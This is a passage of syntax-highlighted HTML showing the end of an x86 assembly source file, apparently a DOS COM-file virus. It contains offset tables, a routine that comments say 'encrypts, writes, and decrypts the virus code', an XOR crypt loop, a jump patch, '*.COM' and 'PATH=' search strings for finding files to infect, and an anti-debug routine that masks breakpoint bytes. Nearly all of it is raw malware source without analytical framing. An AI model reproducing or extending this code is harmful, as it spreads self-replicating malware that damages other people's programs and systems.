</span><span class="sc5">L27</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T28</span><span class="sc4">-</span><span class="sc5">T27</span><span class="sc4">),</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T27</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">L28</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T29</span><span class="sc4">-</span><span class="sc5">T28</span><span class="sc4">),</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T28</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L31</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T32</span><span class="sc4">-</span><span class="sc5">T31</span><span class="sc4">),</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T31</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">L32</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T33</span><span class="sc4">-</span><span class="sc5">T32</span><span class="sc4">),</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T32</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">L33</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T34</span><span class="sc4">-</span><span class="sc5">T33</span><span class="sc4">),</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T33</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">L34</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T35</span><span class="sc4">-</span><span class="sc5">T34</span><span class="sc4">),</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T34</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">L35</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T36</span><span class="sc4">-</span><span class="sc5">T35</span><span class="sc4">),</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T35</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">L36</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T37</span><span class="sc4">-</span><span class="sc5">T36</span><span class="sc4">),</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T36</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">L37</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T38</span><span class="sc4">-</span><span class="sc5">T37</span><span class="sc4">),</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T37</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">L38</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T39</span><span class="sc4">-</span><span class="sc5">T38</span><span class="sc4">),</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">T38</span><span class="sc4">-</span><span class="sc5">data_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; this routine is relocated after the end of data area</span><span class="sc0">
</span><span class="sc1">; this routine encrypts, writes, and decrypts the virus code</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">begin1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc5">getloc</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">dat2</span><span class="sc0"> </span><span class="sc1">; get off (data_end-entry2) plus max_msk</span><span class="sc0">
                </span><span class="sc5">getloc</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">dat1</span><span class="sc0"> </span><span class="sc1">; get decode ket</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc1">; and set the begin encrypt address</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">data_begin</span><span class="sc4">-</span><span class="sc5">entry2</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_end</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">entry</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_begin</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">entry</span><span class="sc0">
                </span><span class="sc5">doscall</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0"> </span><span class="sc1">; save the status of the write</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc5">getloc</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">dat2</span><span class="sc0"> </span><span class="sc1">; get off (data_end-entry2) plus max_msk</span><span class="sc0">
                </span><span class="sc5">getloc</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">dat1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">data_begin</span><span class="sc4">-</span><span class="sc5">entry2</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; restore the DOS write's status</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">crypt</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">crypt</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">end1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; global work space and constants</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">old_code</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc0">
</span><span class="sc5">jump_code</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">com_search</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.COM'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">path_chars</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'PATH='</span><span class="sc0">
</span><span class="sc5">file_name</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">my_dta</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2Bh</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">data_end</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">stopdebug</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">scan_bytes</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0CCh</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">precrypt</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">   </span><span class="sc1">; allocate locals</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc5">local_stack</span><span class="sc0">
                </span><span class="sc5">doscall</span><span class="sc0"> </span><span class="sc2">02ch</span><span class="sc0">  </span><span class="sc1">; seed the random number generator</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc5">setloc</span><span class="sc0"> </span><span class="sc5">rand_seed</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc5">lp999</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">08000h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">scan_bytes</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">repnz</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">done998</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_end</span><span class="sc0">
                </span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">done998</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">scasb</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">lp999</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
                </span><span class="sc5">getloc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">rand_seed</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc1">; skip the masked byte</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">lp999</span><span class="sc0">
</span><span class="sc5">done998</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0">        </span><span class="sc9">ends</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
